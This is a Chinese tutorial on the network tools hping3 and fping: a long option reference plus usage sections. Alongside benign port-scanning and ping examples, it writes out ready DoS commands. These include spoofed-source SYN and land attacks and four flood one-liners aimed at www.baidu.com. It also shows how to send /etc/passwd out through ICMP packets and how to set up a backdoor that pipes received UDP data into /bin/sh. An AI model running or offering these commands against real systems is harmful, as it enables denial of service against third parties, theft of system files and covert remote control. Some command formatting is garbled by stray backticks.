# hping3 使用详解 

hping3命令：http://man.linuxde.net/hping3
Testing firewall rules with Hping3 - examples：http://0daysecurity.com/articles/hping3_examples.html

攻防宝典：利用hping3和伪造IP地址执行DOS攻击：http://netsecurity.51cto.com/art/201508/489303.htm
DoS***方法（hping3）：http://19920624.blog.51cto.com/9632075/1584465
Nmap、Netcat、Hping3工具对比：http://www.2cto.com/article/201210/158961.html

```
用法: hping3 host [options]`` ``-h --help   显示帮助`` ``-``v` `--version  显示版本`` ``-c --count   发送数据包的数目`` ``-i --interval 发送数据包间隔的时间 (uX即X微秒, 例如： -i u1000)``   ``--fast   等同 -i u10000 (每秒10个包)``   ``--faster  等同 -i u1000 (每秒100个包)``   ``--flood   尽最快发送数据包，不显示回复。`` ``-n --numeric  数字化输出，象征性输出主机地址。`` ``-q --quiet   安静模式`` ``-I --interface 网卡接口 (默认路由接口)`` ``-V --verbose  详细模式`` ``-D --debug   调试信息`` ``-z --bind   绑定ctrl+z到ttl(默认为目的端口)`` ``-Z --unbind  取消绑定ctrl+z键``   ``--beep   对于接收到的每个匹配数据包蜂鸣声提示` `模式选择`` ``default mode   TCP  ``//` `默认模式是 TCP`` ``-0 --rawip   RAWIP模式，原始IP模式。在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。`` ``-1 --icmp    ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。`` ``-2 --udp    UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。`` ``-8 --scan    SCAN mode. ``//``扫描模式 指定扫描对应的端口。``          ``Example: hping --scan 1-30,70-90 -S www.target.host  ``//` `扫描`` ``-9 --listen   listen mode ``//` `监听模式`` ` `IP 模式`` ``-a --spoof   spoof ``source` `address ``//``源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。`` ``--rand-dest   random destionation address mode. see the ``man``. ``//` `随机目的地址模式。详细使用 ``man` `命令`` ``--rand-``source`  `random ``source` `address mode. see the ``man``.    ``//` `随机源地址模式。详细使用 ``man` `命令`` ``-t --ttl    ttl (默认 64) ``//``修改 ttl 值`` ``-N --``id`     `id` `(默认 随机) ``//` `hping 中的 ID 值，缺省为随机值`` ``-W --winid   使用win* ``id``字节顺序 ``//``使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的``id``回应不同的，这选项可以让你的ID回应和WINDOWS一样。`` ``-r --rel    相对``id``字段(估计主机流量) ``//``更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。`` ``-f --frag    拆分数据包更多的frag. (may pass weak acl)  ``//``分段，可以测试对方或者交换机碎片处理能力，缺省16字节。`` ``-x --morefrag  设置更多的分段标志  ``//` `大量碎片，泪滴攻击。`` ``-y --dontfrag  设置不分段标志  ``//` `发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。`` ``-g --fragoff  ``set` `the fragment offset  ``//` `设置断偏移。`` ``-m --mtu    设置虚拟最大传输单元, implies --frag ``if` `packet size > mtu  ``//` `设置虚拟MTU值，当大于mtu的时候分段。`` ``-o --tos    ``type` `of service (default 0x00), try --tos help     ``//` `tos字段，缺省0x00，尽力而为？`` ``-G --rroute   includes RECORD_ROUTE option and display the route buffer  ``//` `记录IP路由，并显示路由缓冲。`` ``--lsrr      松散源路由并记录路由    ``//` `松散源路由`` ``--ssrr      严格源路由并记录路由   ``//` `严格源路由`` ``-H --ipproto  设置IP协议字段，仅在RAW IP模式下使用  ``//``在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。` `ICMP 模式`` ``-C --icmptype  icmp类型(默认``echo``请求)  ``//` `ICMP类型，缺省回显请求。`` ``-K --icmpcode  icmp代号(默认0)   ``//` `ICMP代码。``   ``--force-icmp 发送所有icmp类型(默认仅发送支持的类型)  ``//` `强制ICMP类型。``   ``--icmp-gw  设置ICMP重定向网关地址(默认0.0.0.0)  ``//` `ICMP重定向``   ``--icmp-ts  等同 --icmp --icmptype 13 (ICMP 时间戳)      ``//` `icmp时间戳``   ``--icmp-addr 等同 --icmp --icmptype 17 (ICMP 地址子网掩码) ``//` `icmp子网地址``   ``--icmp-help 显示其他icmp选项帮助   ``//` `ICMP帮助` `UDP``/TCP` `模式`` ``-s --baseport  base ``source` `port       (default random)       ``//` `缺省随机源端口`` ``-p --destport  [+][+]<port> destination port(default 0) ctrl+z inc``/dec`  `//` `缺省随机源端口`` ``-k --keep    keep still ``source` `port   ``//` `保持源端口`` ``-w --win    winsize (default 64)    ``//` `win的滑动窗口。windows发送字节(默认64)`` ``-O --tcpoff   ``set` `fake tcp data offset   (instead of tcphdrlen / 4)  ``//` `设置伪造tcp数据偏移量(取代tcp地址长度除4)`` ``-Q --seqnum   shows only tcp sequence number    ``//` `仅显示tcp序列号`` ``-b --badcksum  (尝试)发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP``/TCP``校验和。`` ``-M --setseq   设置TCP序列号`` ``-L --setack   设置TCP的ack  ------------------------------------- (不是 TCP 的 ACK 标志位)`` ``-F --fin    ``set` `FIN flag`` ``-S --syn    ``set` `SYN flag`` ``-R --rst    ``set` `RST flag`` ``-P --push    ``set` `PUSH flag`` ``-A --ack    ``set` `ACK flag  ------------------------------------- （设置 TCP 的 ACK 标志 位）`` ``-U --urg    ``set` `URG flag   ``//` `一大堆IP抱头的设置。`` ``-X --xmas    ``set` `X unused flag (0x40)`` ``-Y --ymas    ``set` `Y unused flag (0x80)`` ``--tcpexitcode  使用last tcp-> th_flags作为退出码`` ``--tcp-mss    启用具有给定值的TCP MSS选项`` ``--tcp-timestamp 启用TCP时间戳选项来猜测HZ``/uptime` `Common ``//``通用设置`` ``-d --data    data size  (default is 0)  ``//` `发送数据包大小，缺省是0。`` ``-E --``file`    `文件数据`` ``-e --sign    添加“签名”`` ``-j --dump    转储为十六进制数据包`` ``-J --print   转储为可打印字符`` ``-B --safe    启用“安全”协议`` ``-u --end    告诉你什么时候--``file``达到EOF并防止倒回`` ``-T --``traceroute` `traceroute``模式(等同使用 --bind 且--ttl 1)`` ``--``tr``-stop    在``traceroute``模式下收到第一个不是ICMP时退出`` ``--``tr``-keep-ttl  保持源TTL固定，仅用于监视一跳`` ``--``tr``-no-rtt   不要在跟踪路由模式下计算/显示RTT信息 ARS包描述（新增功能，不稳定）``ARS packet description (new, unstable)`` ``--apd-send    发送APD描述数据包(参见docs / APD.txt)
```

# Hping3 功能

Hping3 主要有以下典型功能应用：

## 防火墙测试

使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：http://0daysecurity.com/articles/hping3_examples.html 

测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。

```
hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10
```

 

## 端口扫描

Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：

```
hping3 -I eth0 -S 192.168.10.1 -p 80
```

其中-I eth0指定使用eth0端口，-S指定TCP包的标志位SYN，-p 80指定探测的目的端口。 

hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。

 

## Idle扫描

Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。 

该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。

 

## 拒绝服务攻击

使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。

```
hping3 -I eth0 -a 192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
```

其他攻击如smurf、teardrop、land attack等也很容易构建出来。

 

## 文件传输

Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：

```
hping3 192.168.1.159 --listen signature --safe --icmp
```

监听ICMP包中的签名，根据签名解析出文件内容。 

在发送端使用签名打包的ICMP包发送文件：

```
hping3 192.168.1.108--icmp -d 100 --sign signature --``file` `/etc/passwd
```

将/etc/passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。

 

## 木马功能

如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。

示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。 

在木马启动端：

```
hping3 192.168.10.66 --listen signature --safe --udp -p 53 | ``/bin/sh
```

在远程控制端：

```
echo` `ls` `>``test``.cmd``hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --``file` `.``/test``.cmd
```

将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。 

当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。

 

## hping主要是进行DDOS攻击的

1、UDP ddos攻击：

```
hping3 -c 10000 -d 120 --udp -w 64 -p 80 --flood --rand-``source` `www.baidu.com
```

2、ICMP ddos攻击：

```
hping3 -c 10000 -d 120 --icmp -w 64 -p 80 --flood --rand-``source` `www.baidu.com
```

3、SYN ddos攻击：

```
hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-``source` `www.baidu.com
```

4、ACK ddos攻击：

```
hping3 -c 10000 -d 120 -A -w 64 -p 80 --flood --rand-``source` `www.baidu.com
```

 

# fping 用法

**[fping 官网](http://www.fping.org/)**

​    fping 是一个将 ICMP echo 探测器发送到网络主机的程序，类似于 ping，可以看作是 ping 的增强版。但是 fping 在 ping多个主机时性能更好。

```
Usage: fping [options] [targets...]``  ``-a     显示存活目标，即可``ping``通的目标``  ``-A     将目标以ip地址的形式显示``  ``-b n    ``ping` `数据包的大小。（默认为56）``  ``-B f    ``set` `exponential backoff factor to f``  ``-c n    ``ping``每个目标的次数 (默认为1)``  ``-C n    同-c, 返回的结果为冗长格式``  ``-D     每个输出行打印时间戳``  ``-e     显示返回数据包所费时间``  ``-f ``file`  `从文件获取目标列表( - 表示从标准输入)(不能与 -g 同时使用)``  ``-g     生成目标列表(不能与 -f 同时使用)``        ``(可指定目标的开始和结束IP， 或者提供ip的子网掩码)``        ``(例：fping -g 192.168.1.0 192.168.1.255 或 fping -g 192.168.1.0``/24``)        ``  ``-H n    设置ip的TTL值 (生存时间)``  ``-i n    ``ping``包之间的间隔(单位：毫秒)(默认25)``  ``-I ``if`   `绑定到特定的接口``  ``-l     循环发送``ping``  ``-m     ``ping``目标主机的多个网口``  ``-M     设置不分段标记``  ``-n     将目标以主机名或域名显示(等价于 -d )``  ``-N     输出兼容netdata (-l -Q are required)``  ``-o     显示累计中断时间 (lost packets * packet interval)``  ``-O n    在ICMP包中设置服务的类型(tos)标志``  ``-p n    对同一个目标的``ping``包间隔(毫秒)``         ``(在循环和统计模式中，默认为1000)``  ``-q     安静模式(不显示每个目标或每个``ping``的结果)``  ``-Q n    同-q, 但是每n秒显示信息概要``  ``-r n    当``ping``失败时，最大重试次数(默认为3次)``  ``-R     random packet data (to foil link data compression)``  ``-s     打印最后的统计数据``  ``-S addr  设置源ip地址``  ``-t n    单个目标的超时时间(毫秒)(默认500)``  ``-T n    请忽略(为兼容fping 2.4)``  ``-u     显示不可到达的目标``  ``-``v`     `显示版本号``  ``targets  需要``ping``的目标列表(不能和 -f 同时使用)
```

示例

```
fping -A -u -c 4 192.168.1.1 192.168.1.74 192.168.1.20
```